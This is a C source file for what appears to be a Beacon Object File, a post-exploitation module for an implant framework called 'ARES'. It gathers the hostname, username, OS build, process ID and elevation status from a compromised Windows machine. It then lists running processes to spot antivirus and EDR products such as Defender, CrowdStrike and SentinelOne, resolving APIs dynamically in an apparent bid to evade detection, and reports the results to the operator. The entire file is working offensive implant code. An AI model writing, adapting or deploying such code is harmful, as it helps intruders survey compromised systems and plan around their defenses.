/*
 * ARES BOF — System Reconnaissance (no-CRT version)
 */
#include <windows.h>
#include <tlhelp32.h>

void BeaconOutput(int type, const char* data, int len);
#define CALLBACK_OUTPUT 0

/* Simple append string to buf */
static int _bcat(char* buf, int n, int max, const char* s) {
    while (*s && n < max - 1) buf[n++] = *s++;
    buf[n] = 0;
    return n;
}

/* Simple DWORD to decimal string */
static int _dcat(char* buf, int n, int max, DWORD v) {
    char tmp[12]; int i = 0;
    if (v == 0) { if (n < max-1) buf[n++] = '0'; buf[n]=0; return n; }
    while (v > 0) { tmp[i++] = '0' + (v % 10); v /= 10; }
    while (i-- > 0 && n < max-1) buf[n++] = tmp[i];
    buf[n] = 0;
    return n;
}

void go(char* args, int alen)
{
    char buf[2048];
    { char* p = buf; int s = sizeof(buf); while(s--) *p++ = 0; }
    int n = 0, max = (int)sizeof(buf);

    /* System info */
    char hostname[64]; { char* p = hostname; int s = 64; while(s--) *p++ = 0; }
    char username[64]; { char* p = username; int s = 64; while(s--) *p++ = 0; }
    DWORD hs = 63, us = 63;
    GetComputerNameA(hostname, &hs);
    GetUserNameA(username, &us);

    /* OS version */
    OSVERSIONINFOW vi; 
    { char* p = (char*)&vi; int s = sizeof(vi); while(s--) *p++ = 0; }
    vi.dwOSVersionInfoSize = sizeof(vi);
    GetVersionExW(&vi);

    /* Privileges */
    BOOL elevated = FALSE;
    HANDLE tok;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        TOKEN_ELEVATION elev;
        { char* p = (char*)&elev; int s = sizeof(elev); while(s--) *p++ = 0; }
        DWORD sz = sizeof(elev);
        if (GetTokenInformation(tok, TokenElevation, &elev, sizeof(elev), &sz))
            elevated = elev.TokenIsElevated;
        CloseHandle(tok);
    }

    n = _bcat(buf, n, max, "[RECON]\nHostname: ");
    n = _bcat(buf, n, max, hostname);
    n = _bcat(buf, n, max, "\nUsername: ");
    n = _bcat(buf, n, max, username);
    n = _bcat(buf, n, max, "\nOS: Windows ");
    n = _dcat(buf, n, max, vi.dwMajorVersion);
    n = _bcat(buf, n, max, ".");
    n = _dcat(buf, n, max, vi.dwMinorVersion);
    n = _bcat(buf, n, max, " Build ");
    n = _dcat(buf, n, max, vi.dwBuildNumber);
    n = _bcat(buf, n, max, "\nPID: ");
    n = _dcat(buf, n, max, GetCurrentProcessId());
    n = _bcat(buf, n, max, "\nElevated: ");
    n = _bcat(buf, n, max, elevated ? "YES" : "NO");
    n = _bcat(buf, n, max, "\n");

    /* AV detection via dynamic API */
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    typedef HANDLE (WINAPI *pSnapshot)(DWORD, DWORD);
    typedef BOOL (WINAPI *pProc32)(HANDLE, LPPROCESSENTRY32W);
    pSnapshot fnSnap = NULL;
    pProc32 fnFirst = NULL, fnNext = NULL;
    if (hK32) {
        fnSnap  = (pSnapshot)GetProcAddress(hK32, "CreateToolhelp32Snapshot");
        fnFirst = (pProc32) GetProcAddress(hK32, "Process32FirstW");
        fnNext  = (pProc32) GetProcAddress(hK32, "Process32NextW");
    }

    if (fnSnap && fnFirst && fnNext) {
        static const char* avNamesA[] = {
            "MsMpEng","MsSense","CSFalcon","CylanceSvc",
            "SentinelAgent","bdagent","avp","ekrn","mbam",NULL
        };
        HANDLE snap = fnSnap(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe;
            { char* p = (char*)&pe; int s = sizeof(pe); while(s--) *p++ = 0; }
            pe.dwSize = sizeof(pe);
            if (fnFirst(snap, &pe)) {
                n = _bcat(buf, n, max, "\n[SECURITY]\n");
                do {
                    /* Convert to narrow */
                    char pname[260];
                    { char* p = pname; int s = 260; while(s--) *p++ = 0; }
                    WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, pname, 259, NULL, NULL);
                    for (int i = 0; avNamesA[i]; i++) {
                        /* manual strstr */
                        const char* h = pname; const char* ndl = avNamesA[i];
                        BOOL found = FALSE;
                        while (*h && !found) {
                            const char* a = h; const char* b = ndl;
                            while (*a && *b && *a == *b) { a++; b++; }
                            if (!*b) found = TRUE;
                            h++;
                        }
                        if (found) {
                            n = _bcat(buf, n, max, "  [AV] ");
                            n = _bcat(buf, n, max, pname);
                            n = _bcat(buf, n, max, "\n");
                        }
                    }
                } while (fnNext(snap, &pe) && n < max - 200);
            }
            CloseHandle(snap);
        }
    }

    BeaconOutput(CALLBACK_OUTPUT, buf, n);
}
